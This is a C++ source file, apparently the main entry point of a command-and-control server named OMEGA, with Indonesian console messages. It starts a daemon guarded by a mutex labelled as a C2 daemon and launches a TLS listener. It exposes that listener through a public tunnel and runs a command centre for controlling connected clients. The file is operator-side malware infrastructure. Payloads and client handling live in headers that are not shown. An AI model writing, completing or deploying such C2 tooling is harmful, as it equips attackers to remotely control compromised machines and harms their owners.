#include "../include/common_state.h"
#include "../include/ui_manager.h"
#include "../include/ipc_manager.h"
#include "../include/tunnel_manager.h"
#include "../include/daemon_core.h"
#include "../include/session_manager.h"
#include "../ssl_server.h"
#include <iostream>
#include <thread>

#ifdef _WIN32
#include <windows.h>
#endif

int main(int argc, char* argv[]) {
    EnableVTMode();
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

#ifdef _WIN32
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif

    // MODE DAEMON (Background Core)
    if (argc > 1 && std::string(argv[1]) == "--daemon") {
        HANDLE hMutex = CreateMutexA(NULL, TRUE, "Local\\OMEGA_C2_DAEMON_MUTEX");
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            if (hMutex) CloseHandle(hMutex);
            return 0;
        }

        SSL_library_init();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();

        SSLServer server(SERVER_PORT, "cert/cert.pem", "cert/key.pem");
        if (!server.Start()) return EXIT_FAILURE;

        std::string public_url;
        StartTunnelAndGetUrl(SERVER_PORT, public_url);

        std::thread ipc_thread(IPCServerThread);
        ipc_thread.detach();
        std::thread acceptor(AcceptorThread, &server);
        acceptor.detach();

        while (c2_running) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }

        server.Stop();
        WSACleanup();
        return 0;
    }

    // MODE UTAMA (UI + Auto-Server)
#ifdef _WIN32
    SetConsoleTitleA(SERVER_TITLE.c_str());
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
#endif

    PrintBanner();

    std::string test = SendIPCRequest("STATUS");
    if (test == "ERR_CONN" || test == "ERR_READ") {
        is_master_process = true;
        std::cout << INFO_TAG << "Starting Server Engine..." << std::endl;
        
        // Cek Port
        if (!IsPortAvailable(SERVER_PORT)) {
            std::cout << ERROR_TAG << "Port C2 (" << SERVER_PORT << ") sedang digunakan!" << std::endl;
            return 1;
        }
        if (!IsPortAvailable(INTERNAL_IPC_PORT)) {
            std::cout << ERROR_TAG << "Port IPC (" << INTERNAL_IPC_PORT << ") sedang digunakan!" << std::endl;
            return 1;
        }

        SSL_library_init();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();

        SSLServer server(SERVER_PORT, "cert/cert.pem", "cert/key.pem");
        if (!server.Start()) {
            return 1;
        }

        std::string public_url;
        StartTunnelAndGetUrl(SERVER_PORT, public_url);

        std::thread ipc_thread(IPCServerThread);
        ipc_thread.detach();
        std::thread acceptor(AcceptorThread, &server);
        acceptor.detach();

        CommandCenter();
        server.Stop();
    } else {
        std::cout << SUCCESS_TAG << "Terhubung ke Core yang sedang berjalan." << std::endl;
        PrintServerStatus();
        CommandCenter();
    }

    WSACleanup();
    return 0;
}
